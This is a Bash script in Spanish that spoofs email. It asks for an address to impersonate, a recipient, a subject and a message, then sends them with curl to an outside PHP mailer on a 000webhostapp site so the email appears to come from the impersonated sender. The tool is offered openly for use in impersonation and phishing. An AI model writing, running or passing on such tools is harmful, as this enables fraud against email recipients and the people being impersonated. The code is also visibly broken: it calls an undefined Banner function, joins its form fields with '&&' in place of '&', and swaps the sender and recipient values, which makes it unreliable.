#!/bin/bash
clear


enviarUnCorreo(){
clear

        echo 'By: B4rc0d37 @CANAL YOUTUBE https://www.youtube.com/c/TutorialesHackingEtico'
		
		echo 'Direccion de correo electronico para suplantar'
		read remitente
		clear
		
		echo 'Remitente -->' $remitente
		echo 'Direccion de correo receptor'
		read receptor
		clear
		
		echo 'Remitente -->' $remitente
		echo 'Receptor del correo -->' $receptor
		echo 'Asunto del correo'
		read asunto 
		clear
		
		echo 'Remitente -->' $remitente
		echo 'Receptor del correo -->' $receptor
		echo 'Asunto del correo -->' $asunto
		echo 'Mensaje'
		read mensaje
		clear
		
		echo 'Remitente -->' $remitente
		echo 'Receptor del correo -->' $receptor
		echo 'Asunto del correo -->' $asunto
		echo 'Mensaje -->'$mensaje
		echo '¿Estas Seguro que deceas enviar este mensaje? [s/n]' 
		read Seguro
		case $Seguro in
			s)
			curl --data "remitente=$receptor && asunto=$asunto && msj=$mensaje && desde=$remitente" https://insessorial-halls.000webhostapp.com/send.php  
				;;	
			n)
				clear
				Banner 
				menuInicial
		esac

}


menuInicial(){
clear
	
echo -e '\e[92mBienvenido '
echo ''
echo 'presione s Iniciar suplantacaión'
read opcion
case $opcion in 

	
	s)
	 enviarUnCorreo
	;;
								
	esac

}

Banner 
menuInicial
